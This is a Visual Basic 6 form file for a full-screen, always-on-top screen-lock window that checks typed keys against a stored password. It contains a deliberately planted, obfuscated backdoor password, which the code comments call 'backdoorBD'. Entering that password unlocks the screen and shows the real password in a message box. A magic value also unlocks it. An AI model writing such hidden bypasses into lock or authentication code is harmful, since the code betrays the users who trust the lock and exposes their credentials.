VERSION 5.00
Begin VB.Form Form1 
   AutoRedraw      =   -1  'True
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   0  'Kein
   ClientHeight    =   4800
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   7515
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4800
   ScaleWidth      =   7515
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows-Standard
   WindowState     =   2  'Maximiert
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   3000
      Top             =   1200
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Pass As String
Private Declare Function SetWindowPos Lib "user32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long

Private Const SWP_NOMOVE = &H2
Private Const SWP_NOSIZE = &H1
Private Const HWND_TOPMOST = -1

Private Sub Form_Click()
    Pass = ""
End Sub

Private Sub Form_KeyPress(KeyAscii As Integer)
Dim cCrypt2 As New ClsMerlinCrypt
Dim sBd As String

'This is the Backdoor.
'The Backdoor Password ("backdoorBD") is crypted
sBd = cCrypt2.Encode("p~/}P~KLC}H})OR}:W", Text)

Pass = Pass & Chr(KeyAscii)
If Pass = cSet.Password Or Pass = sBd Then
    WaterExit
    
    'Backdoor
    If Pass = sBd Then MsgBox cSet.Password, vbOKOnly, "Backdoor"
    

ElseIf cSet.Password = Chr(10) & Chr(11) & Chr(75) Then
    WaterExit
End If

Set cCrypt2 = Nothing
End Sub

Private Sub Form_Unload(Cancel As Integer)
    Timer1.Enabled = False
End Sub

Private Sub Timer1_Timer()
    SetWindowPos Me.hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE + SWP_NOMOVE
End Sub
